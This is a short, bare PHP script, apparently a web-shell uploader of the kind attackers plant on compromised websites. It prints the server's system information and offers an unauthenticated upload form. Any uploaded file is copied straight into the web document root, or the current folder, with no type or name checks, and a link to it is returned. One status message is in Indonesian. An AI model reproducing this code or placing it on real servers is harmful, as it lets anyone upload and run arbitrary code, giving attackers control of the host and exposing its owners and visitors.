<?php
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='myfile'>
	  <input type='submit' name='upload' value='upload'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['myfile']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['myfile']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "upload successful > <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "upload failed at document root.";
		}
	} else {
		if(@copy($_FILES['myfile']['tmp_name'], $files)) {
			echo "upload successful. <b>$files</b> di folder ini";
		} else {
			echo "upload failed.";
		}
	}
}
?>
